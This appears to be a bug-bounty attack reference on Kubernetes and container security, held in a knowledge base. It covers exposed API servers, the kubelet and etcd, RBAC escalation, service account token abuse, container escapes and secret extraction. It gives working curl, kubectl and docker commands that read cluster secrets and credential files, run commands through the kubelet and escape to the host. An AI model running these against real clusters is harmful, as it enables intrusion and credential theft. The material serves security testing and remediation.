# Kubernetes & Container Security — Attack Reference
> Source: Kubernetes docs, HackTricks, NSA/CISA K8s Hardening Guide, OWASP K8s Top 10 | RAG Knowledge Base | Full detail preserved
> Related: `cloud-attacks.md`, `ci-cd-attacks.md`, `bug-chains.md`

---

## Overview

Cloud-native targets expose Kubernetes API, etcd, dashboards, service account tokens, and container escape paths. Common in bug bounty via misconfigured staging clusters, exposed dev environments, and SSRF-to-metadata pivoting.

---

## Attack Surface Map

```
External
├── K8s API server (6443) — exposed with weak/no auth
├── Dashboard (8443) — skip login enabled
├── kubelet (10250) — unauthenticated access
├── etcd (2379) — no TLS/client auth
├── Ingress misconfig — path to internal services
└── Container registry — pull secrets, public images

Internal (via SSRF/compromised pod)
├── Service account token mount
├── Kubernetes API from pod network
├── Cloud metadata → node IAM role
├── Secrets in env vars / mounted files
└── Docker socket mount → container escape
```

---

## K8s API Server Attacks

### Unauthenticated Access
```bash
curl -k https://target:6443/api/v1/namespaces
curl -k https://target:6443/version
```

### Anonymous RBAC
```bash
kubectl --server=https://target:6443 auth can-i --list
```

If `system:anonymous` has list/get secrets → Critical.

### Common Exposed Endpoints
```
/api/v1/namespaces
/api/v1/secrets
/api/v1/pods
/apis/apps/v1/deployments
/metrics
/healthz
```

---

## RBAC Misconfiguration

### Overprivileged Roles
```yaml
# VULNERABLE
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
```

### Dangerous Verbs on Secrets
```yaml
resources: ["secrets"]
verbs: ["get", "list", "watch"]
```

### Privilege Escalation Paths (Common)
| From | To | Method |
|---|---|---|
| pod create | cluster-admin | Create pod with SA that has escalate |
| secret read | cluster-admin | Extract admin kubeconfig from secret |
| impersonate | admin | `impersonate` verb on users/groups |
| bind | admin | Create ClusterRoleBinding to cluster-admin |
| exec into pod | node access | kubectl exec → mount host filesystem |

Tools: `kubectl-who-can`, `rakkess`, `peirates`

---

## Service Account Token Abuse

Every pod gets token at:
```
/var/run/secrets/kubernetes.io/serviceaccount/token
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
```

From compromised pod:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

### Default Service Account Overprivilege
Many deployments use default SA with excessive ClusterRoleBinding.

---

## etcd Exposure

etcd stores ALL cluster secrets in plaintext (unless encryption at rest enabled).

```bash
etcdctl --endpoints=https://target:2379 \
  --cert=admin.crt --key=admin.key \
  get / --prefix --keys-only
```

**Unauthenticated etcd (Critical):**
```bash
curl http://target:2379/v2/keys/?recursive=true
```

Extract: TLS certs, secrets, config maps, tokens.

---

## Kubernetes Dashboard

### Skip Login Enabled
```yaml
# VULNERABLE dashboard settings
enableSkipLogin: true
```

Access `/api/v1/login/status` → skip → full cluster control via UI.

### Dashboard Exposed Publicly
Common on `:8443`, `:30000`, `:443` with self-signed cert.

---

## kubelet API

### Unauthenticated kubelet (10250)
```bash
curl -k https://node:10250/pods
curl -k https://node:10250/run/<namespace>/<pod>/<container> -d "cmd=id"
```

Read pod specs, env vars, secrets references. Execute commands if enabled.

---

## Container Escape

### Privileged Container
```yaml
securityContext:
  privileged: true
```
Full host access — mount host filesystem, escape to node.

### hostPID / hostNetwork / hostPath
```yaml
hostPID: true
volumes:
- hostPath:
    path: /
```

### Docker Socket Mount
```yaml
volumes:
- hostPath:
    path: /var/run/docker.sock
```
From inside container:
```bash
docker run -v /:/host -it alpine chroot /host
```

### CVE-Based Escapes
Track: runc CVEs, containerd bugs, kernel CVEs on node.

---

## Secrets & ConfigMaps

### Exposed via API
```bash
kubectl get secrets -A -o yaml
kubectl get configmaps -A -o yaml
```

Common secret contents: DB passwords, API keys, TLS private keys, cloud credentials.

### Exposed via Environment Variables
```bash
kubectl describe pod <pod> | grep -A20 Environment
# Or from inside pod:
env | grep -i pass
cat /proc/1/environ
```

### Exposed in Logs
Apps logging connection strings on startup.

---

## Ingress / Network Policy Gaps

### Internal Service Exposure
Ingress routes `/internal` → internal-only service without network policy.

### SSRF to Cluster Services
From app SSRF:
```
http://kubernetes.default.svc
http://10.96.0.1:443
http://prometheus.monitoring.svc:9090
http://redis.default.svc:6379
```

Cluster IP ranges: `10.0.0.0/8`, `172.16.0.0/12`, `100.64.0.0/10` (varies).

---

## Image Registry Attacks

### Public Registry Without Auth
- Harbor, Nexus, Docker Registry v2 exposed
- Pull private images, find secrets in layers

### Image Pull Secrets in Namespace
Extract from secrets → pull production images → analyze for hardcoded creds.

### Poisoned Image Push
If registry credentials writable → push backdoored image → deploy.

---

## Cloud Provider K8s Integration

### EKS
- IAM roles for service accounts (IRSA)
- SSRF → IMDS → node role (if IMDSv1)

### GKE
- Workload Identity
- Metadata server on node

### AKS
- Managed Identity
- Key Vault integration secrets

See `cloud-attacks.md` for metadata attacks.

---

## Recon Methodology

```
1. Port scan target org for 6443, 8443, 10250, 2379
2. Check https://target:6443/version (unauthenticated)
3. Search GitHub for kubeconfig, kubectl config, helm values
4. Shodan: port:6443 product:kubernetes
5. From SSRF: hit kubernetes.default.svc
6. If pod access: enumerate SA token permissions
7. Check dashboard on common paths: /api/v1/login
```

---

## Bug Bounty Report Template

```markdown
## Summary
Exposed Kubernetes API server at k8s-dev.target.com:6443 allows unauthenticated
listing of all namespaces and secrets, exposing [N] production credentials.

## Steps
1. curl -k https://k8s-dev.target.com:6443/api/v1/namespaces
2. curl -k https://k8s-dev.target.com:6443/api/v1/secrets -H "Authorization: Bearer [anonymous-if-applicable]"

## Impact
Full cluster compromise — extract all secrets, deploy malicious workloads,
pivot to cloud infrastructure via service account IAM bindings.

## Remediation
- Restrict API server to private network/VPN
- Disable anonymous authentication
- Enable RBAC with least privilege
- Encrypt etcd at rest
```

---

## CWE / MITRE

| Issue | CWE | MITRE |
|---|---|---|
| RBAC misconfig | CWE-269 | T1078 |
| Exposed secrets | CWE-522 | T1552 |
| Container escape | CWE-668 | T1611 |
| etcd exposure | CWE-200 | T1552.005 |

---

## Tools

| Tool | Use |
|---|---|
| kubectl | Cluster interaction |
| peirates | K8s privesc |
| kube-hunter | Automated K8s pentest |
| kube-bench | CIS benchmark |
| kubeaudit | Security audit |
| helm | Chart analysis |

---

## Related Files

- `cloud-attacks.md` — AWS/GCP/Azure metadata and IAM
- `ci-cd-attacks.md` — pipeline → cluster deploy keys
- `bug-chains.md` — SSRF → internal K8s API chains
